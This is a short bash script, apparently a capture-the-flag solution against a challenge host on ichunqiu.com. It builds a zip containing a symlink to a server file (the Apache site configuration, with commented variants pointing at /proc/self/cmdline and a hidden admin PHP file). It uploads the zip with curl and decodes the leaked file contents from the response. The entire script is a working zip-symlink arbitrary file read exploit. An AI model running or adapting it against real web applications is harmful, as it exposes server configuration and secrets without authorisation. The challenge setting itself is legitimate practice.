#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/06/14, 04:38

rm x x.zip

# ln -s /proc/self/cmdline x
ln -s /etc/apache2/sites-available/000-default.conf x
# /var/www/html/m4nag3r_u_dont_know
# 
# ln -s /var/www/html/m4nag3r_u_dont_know/index.php x

zip x.zip x -y

curl -s -k -q http://2b62a42805674c48b66239b485ba3f8281e30043292e4d61.changame.ichunqiu.com///index.php\?page=70b185c80f225924f86d4a1dedddd120 \
-F file=@x.zip --output - | grep -o '\[view].*' | awk '{print $3}' | awk -F '<' '{print $1}' | base64 -D